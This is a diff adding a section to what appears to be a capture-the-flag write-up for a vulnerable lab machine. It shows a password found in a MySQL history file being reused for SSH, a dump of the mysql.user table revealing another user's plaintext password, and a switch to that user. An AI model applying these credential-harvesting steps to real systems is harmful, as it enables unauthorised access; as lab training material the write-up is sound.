@@ -47,3 +47,27 @@ Opening .mysql_history revealed:
 show databases;
 ALTER USER 'weborf'@'localhost' IDENTIFIED BY 'iheartrainbows44'; 
 ```
+
+While I couldn't remote connect with mysql using the above, it did work for ssh.
+
+## Mysql and sunrise
+
+Once in as weborb, I looked around. Couldn't sudo -l, and my already thorough exploration told me little else was around. However, the entry above from the history table told me that while weborf couldn't connect to sql remotely, it could locally.
+
+`mysql -p` plus the same password `iheartrainbows44` got me in to mysql, and I selected from the users table:
+
+```
+MariaDB [(none)]> select user, password from mysql.user;
++---------+-------------------------------------------+
+| user    | password                                  |
++---------+-------------------------------------------+
+| root    | *C7B6683EEB8FF8329D8390574FAA04DD04B87C58 |
+| sunrise | thefutureissobrightigottawearshades       |
+| weborf  | *A76018C6BB42E371FD7B71D2EC6447AE6E37DB28 |
++---------+-------------------------------------------+
+3 rows in set (0.000 sec)
+
+MariaDB [(none)]>
+```
+
+I was able to use the above password to `su sunrise`.
